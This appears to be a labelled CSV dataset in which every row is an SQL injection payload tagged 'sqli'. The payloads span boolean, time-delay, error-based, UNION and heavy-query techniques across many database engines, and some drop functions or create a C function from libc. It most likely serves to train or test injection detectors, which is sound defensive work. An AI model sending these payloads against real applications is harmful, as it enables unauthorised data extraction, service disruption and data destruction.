"pattern","type"
"select 'qqpjq'||(select (case when (2933=2933) then 1 else 0 end))||'qzvzq'","sqli"
"1"" where 7696=7696 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--","sqli"
"1 where 6523=6523 and 8594=(select 8594 from pg_sleep(5))--","sqli"
"1')) as jmnw where 6496=6496 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"1) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (9841=9841","sqli"
"1"")) rlike (select * from (select(sleep(5)))sgvo) and ((""grct""=""grct","sqli"
"-2601') union all select 2866,2866,2866,2866,2866,2866--","sqli"
"1'||(select 'jlka' where 5436=5436 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","sqli"
"1%'))) and (select * from (select(sleep(5)))gcrr)#","sqli"
"-1366' or make_set(9354=9354,7185) and 'abre'='abre","sqli"
"-3452%' or 1570=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (1570=1570) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and '%'='","sqli"
"1' in boolean mode) order by 1#","sqli"
"1%"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""%""=""","sqli"
"1'||(select 'qtep' where 2572=2572 or (select * from (select(sleep(5)))sddo)#","sqli"
"1%')) or 8156=(select count(*) from generate_series(1,5000000))--","sqli"
"-4807' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'wwki'='wwki","sqli"
"1 rlike (select * from (select(sleep(5)))vwyq)#","sqli"
"1"") and 2954=1256--","sqli"
"1%"" and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","sqli"
"1' (select 'qaar' where 7841=7841 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)) '","sqli"
"1%'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('%'='","sqli"
"1%';select like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='","sqli"
"1)) as syot where 1199=1199;waitfor delay '0:0:5'--","sqli"
"1%'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--","sqli"
"1' (select 'jkgf' where 7487=7487;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","sqli"
"1"" where 2035=2035 and 3824=benchmark(5000000,md5(0x76555642))--","sqli"
"1%')));begin user_lock.sleep(5); end--","sqli"
"1%') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('%'='","sqli"
"1'||(select 'zeet' from dual where 9567=9567 and 8594=(select 8594 from pg_sleep(5))--","sqli"
"1) as guru where 7615=7615 union all select null,null,null,null,null,null,null,null,null,null#","sqli"
"1%"" and 2805=1345","sqli"
"1' in boolean mode) or 8514=benchmark(5000000,md5(0x544d5a4c))#","sqli"
"1') and 6969=(select 6969 from pg_sleep(5)) and ('nqol'='nqol","sqli"
"1 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","sqli"
"1));call regexp_substring(repeat(right(char(2385),0),500000000),null)--","sqli"
"1""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""sdvu"" like ""sdvu","sqli"
"1%';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and '%'='","sqli"
"1'))) rlike sleep(5)#","sqli"
"1%';select like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"1') and (3020=3020)*6703 and ('rskq'='rskq","sqli"
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('wqme'='wqme","sqli"
"1%""))) union all select null,null,null,null--","sqli"
"1"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""iuxs"" like ""iuxs","sqli"
"1"")) as lfte where 3811=3811 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--","sqli"
"1%""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""%""=""","sqli"
"1 where 8114=8114 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"-2204'||(select 'bwae' from dual where 4884=4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#","sqli"
"1%"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""%""=""","sqli"
"1%"");begin dbms_lock.sleep(5); end and (""%""=""","sqli"
"-1598"")) or elt(5329=9628,9628) and ((""hyxq"" like ""hyxq","sqli"
"1'))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","sqli"
"1')) as xirr where 2425=2425;select sleep(5)#","sqli"
"-4904') as ogyu where 2821=2821 or 5982=1643","sqli"
"1"";begin user_lock.sleep(5); end--","sqli"
"1%"")) order by 1--","sqli"
"1 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"1' (select ummn where 8883=8883 and 4241=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (4241=4241) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113)))) '","sqli"
"-3649"")) as eydu where 3220=3220 or elt(8705=1510,1510)--","sqli"
"-4615' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))","sqli"
"1',(select (case when (5154=5154) then 1 else 5154*(select 5154 from master..sysdatabases) end))","sqli"
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('asdc' like 'asdc","sqli"
"1) where 8474=8474 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"1' where 6795=6795 and 8635=(select count(*) from generate_series(1,5000000))--","sqli"
"1%"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""%""=""","sqli"
"1));if(2643=1393) select 2643 else drop function nqss--","sqli"
"1) where 1487=1487;begin dbms_lock.sleep(5); end--","sqli"
"1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('smrw' like 'smrw","sqli"
"1' in boolean mode) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)#","sqli"
"1%"") and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","sqli"
"1"") where 5938=5938 and (select * from (select(sleep(5)))gcrr)#","sqli"
"1')) as hxxm where 3792=3792 and sleep(5)#","sqli"
"1)) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((6010=6010","sqli"
"-9700') or 8811=7862","sqli"
"1%'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('%'='","sqli"
"-9429') order by 1--","sqli"
"1"")) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""pmmr""=""pmmr","sqli"
"1 where 1153=1153 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--","sqli"
"-5350)) or 9323=9323#","sqli"
"1' in boolean mode) and 5725=5552#","sqli"
"1) as duqb where 6495=6495;select (case when (5914=2314) then 5914 else 1/(select 0) end)--","sqli"
"1"") and 4241=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (4241=4241) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and (""hbfr"" like ""hbfr","sqli"
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('ejnt' like 'ejnt","sqli"
"1) where 1096=1096;if(7899=7899) select 7899 else drop function zbbp--","sqli"
"1) or 8421=(select count(*) from generate_series(1,5000000)) and (5215=5215","sqli"
"1',(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))","sqli"
"1"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""vhey""=""vhey","sqli"
"1'||(select 'glyc' from dual where 4058=4058;(select * from (select(sleep(5)))srmq))||'","sqli"
"-1305) or make_set(2298=5545,5545) and (6715=6715","sqli"
"1';begin user_lock.sleep(5); end and 'huti' like 'huti","sqli"
"1'))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""swec"" like ""swec","sqli"
"1%' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and '%'='","sqli"
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""rbqs""=""rbqs","sqli"
"-7552 or 6872=6872","sqli"
"-5438"") union all select 3170,3170--","sqli"
"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""menm"" like ""menm","sqli"
"-8486%'))) or 8571=8571--","sqli"
"1)) as khvx where 7533=7533 union all select null,null,null,null,null,null,null,null--","sqli"
"1"")));select pg_sleep(5) and (((""wqeb""=""wqeb","sqli"
"-2872) where 8797=8797 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","sqli"
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))-- ygbf","sqli"
"(select (chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3287=3287) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","sqli"
"-2216"") where 6692=6692 union all select 6692,6692,6692#","sqli"
"-4135'))) union all select 4413,4413,4413#","sqli"
"1%'))) union all select null,null--","sqli"
"-6279') union all select 3026,3026,3026,3026,3026,3026,3026,3026--","sqli"
"1) and 3824=benchmark(5000000,md5(0x76555642)) and (6786=6786","sqli"
"-2291)) or 4067=5666#","sqli"
"1"")) as xtlt where 9293=9293;select case when 7717=7717 then 1 else null end--","sqli"
"1""));waitfor delay '0:0:5'--","sqli"
"1') where 6672=6672 union all select null,null,null,null,null,null,null,null,null,null--","sqli"
"1'||(select 'yhkt' from dual where 7105=7105 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))||'","sqli"
"1""))) union all select null,null,null,null,null,null,null--","sqli"
"1' in boolean mode) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))#","sqli"
"1"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""smhd"" like ""smhd","sqli"
"1%' or elt(5873=5873,sleep(5))#","sqli"
"1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'raru'='raru","sqli"
"1' (select 'kcix' where 1117=1117;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","sqli"
"-4785' or (8459=8459)*4906 and 'esfn'='esfn","sqli"
"-1238') as lxur where 7075=7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#","sqli"
"1'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('cgou' like 'cgou","sqli"
"1))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((4127=4127","sqli"
"1"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""kldp"" like ""kldp","sqli"
"1%'));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#","sqli"
"1')) as yyud where 4934=4934;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","sqli"
"-3130) union all select 1741,1741,1741,1741,1741,1741,1741,1741#","sqli"
"-1368)) union all select 1310,1310,1310,1310,1310#","sqli"
"1',(select * from generate_series(2636,2636,case when (2636=7071) then 1 else 0 end) limit 1)","sqli"
"1%' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and '%'='","sqli"
"1%') or 8421=(select count(*) from generate_series(1,5000000)) and ('%'='","sqli"
"1' in boolean mode) union all select null,null,null,null,null,null,null,null,null--","sqli"
"-2722"") or 4907=8126#","sqli"
"-3461"")) union all select 6342,6342,6342,6342,6342,6342#","sqli"
"1 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# odvp","sqli"
"1');select (case when (4297=9086) then 4297 else 1/(select 0) end)--","sqli"
"1) where 1559=1559 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--","sqli"
"(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)","sqli"
"-2364' or 6743=7578","sqli"
"1"")) and 9800=8713","sqli"
"1) as sdnd where 9472=9472;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--","sqli"
"1"" where 3692=3692 union all select null,null--","sqli"
"1"")) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","sqli"
"1,(select (case when (8382=8382) then 1 else 1/(select 0) end))","sqli"
"1')) as gqzy where 2312=2312 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and 'zpyx'='zpyx","sqli"
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('zcey'='zcey","sqli"
"-2314%')) union all select 4612,4612--","sqli"
"1"")));select pg_sleep(5) and (((""nvuv"" like ""nvuv","sqli"
"1) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)","sqli"
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))","sqli"
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'jjxn'='jjxn","sqli"
"1') where 3636=3636 or 4240=(select 4240 from pg_sleep(5))--","sqli"
"1') where 9221=9221 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--","sqli"
"-6942') union all select 7280,7280,7280#","sqli"
"1) as uuro where 6784=6784;if(7899=7899) select 7899 else drop function zbbp--","sqli"
"-3362' where 6567=6567 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","sqli"
"1')));waitfor delay '0:0:5' and ((('hrta'='hrta","sqli"
"-5026' or (8459=8459)*4906 and 'uavj' like 'uavj","sqli"
"1'||(select 'uvbb' where 7795=7795 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'","sqli"
"1'))) union all select null,null,null,null,null,null,null--","sqli"
"1');select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","sqli"
"1"") where 1833=1833;select (case when (3344=8103) then 3344 else 1/(select 0) end)--","sqli"
"1"" where 9804=9804 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1'||(select 'fraa' from dual where 9140=9140 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'","sqli"
"1'||(select 'alxi' where 3967=3967 and 2388=benchmark(5000000,md5(0x6d457153))#","sqli"
"1' (select 'xbyn' where 6881=6881;begin user_lock.sleep(5); end) '","sqli"
"1 where 8905=8905 and make_set(7654=1923,1923)--","sqli"
"-3161') or 8501=1796","sqli"
"-5534 or 1983=5721#","sqli"
"1))) and 6358=6735","sqli"
"1' in boolean mode) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","sqli"
